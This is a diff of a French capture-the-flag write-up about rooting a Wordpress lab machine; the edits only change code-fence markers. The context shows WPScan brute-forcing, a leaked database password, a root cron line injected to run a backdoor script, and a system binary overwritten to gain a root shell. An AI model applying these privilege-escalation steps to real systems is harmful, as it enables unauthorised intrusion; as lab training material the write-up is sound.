@@ -21,7 +21,7 @@ Le site web renvoie un *Wordpress* géré par un certain *smiley* :
 
 Je m'empresse d'utiliser [WPscan](https://wpscan.org/) pour énumérer la version de Wordpress et les plugins installés. Cela n'a rien remonté d'intéressant donc on va s'intéresser aux utilisateurs :  
 
-```plain
+```
 $ wpscan --url http://10.1.1.42/ -e u1-100 -P top500.txt
 [+] Enumerating Users
  Brute Forcing Author IDs - Time: 00:00:01 <=================> (100 / 100) 100.00% Time: 00:00:01
@@ -78,13 +78,13 @@ define('DB_PASSWORD', 'Il0veW0rdpress');
 
 Dans le dossier personnel de l'utilisateur on trouve un binaire setuid root :  
 
-```plain
+```
 -rwsr-xr-x 1 root root 7332 Dec 27 06:03 /home/mike/listwww
 ```
 
 Ce dernier a un fonctionnement que l'on peut deviner simplement en appliquant la commande strings dessus :  
 
-```plain
+```
 /lib/ld-linux.so.2
 libc.so.6
 _IO_stdin_used
@@ -111,7 +111,7 @@ Ca ne semble pas laisser trop de possibilités à l'exploitation (jouer sur les 
 
 J'ai donc utilisé [bashcheck](https://github.com/hannob/bashcheck) pour tester la présence de la vulnérabilité bash mais il m'a dis... nope  
 
-```plain
+```
 mike@smiley:~$ ./bashcheck
 Testing /bin/bash ...
 Bash version 4.3.30(1)-release
@@ -129,13 +129,13 @@ J'ai aussi testé la faille XTRACE/PS4 utilisée pour le [CTF /dev/random: k2]({
 
 La machine a une autre particularité qui ne peux pas échapper à des yeux avisés :  
 
-```plain
+```
 -rwxrwxrwx 1 root root  822 Sep  5 05:29 /etc/crontab
 ```
 
 Mais j'ai beau eu rajouter une ligne pour faire exécuter un script toutes les minutes :  
 
-```plain
+```
 */1 * * * * root /tmp/backdoor.py
 ```
 
@@ -147,7 +147,7 @@ Du coup j'ai ressorti le script que j'avais fait pour le [CTF Homeless]({% link 
 
 Le script montre que les taches CRON sont bien lancées mais bizarrement pas la nôtre :(  
 
-```plain
+```
 6028 root /usr/sbin/CRON -f
 6029 root /bin/sh -c test -x /etc/init.d/anacron && /usr/sbin/invoke-rc.d anacron start >/dev/null
 6031 root /bin/sh -c test -x /etc/init.d/anacron && /usr/sbin/invoke-rc.d anacron start >/dev/null
@@ -158,7 +158,7 @@ Le script montre que les taches CRON sont bien lancées mais bizarrement pas la 
 6049 root /bin/sh /usr/sbin/invoke-rc.d anacron start
 ```
 
-```plain
+```
 13317 root /usr/sbin/CRON -f
 13319 root /bin/sh -c   [ -x /usr/lib/php5/sessionclean ] && /usr/lib/php5/sessionclean
 13320 root /bin/sh -e /usr/lib/php5/sessionclean
@@ -171,7 +171,7 @@ Le script montre que les taches CRON sont bien lancées mais bizarrement pas la 
 
 Pas bien grave puisque j'ai choisi d'écraser le binaire *sort* par mon script Python initial qui m'a donné un accès root plusieurs minutes plus tard ([voir le Github d'infodox](https://github.com/infodox/python-pty-shells) pour des shells sympas en Python) :  
 
-```plain
+```
 root@smiley:~# id
 uid=0(root) gid=0(root) groups=0(root)
 root@smiley:~# cd /root
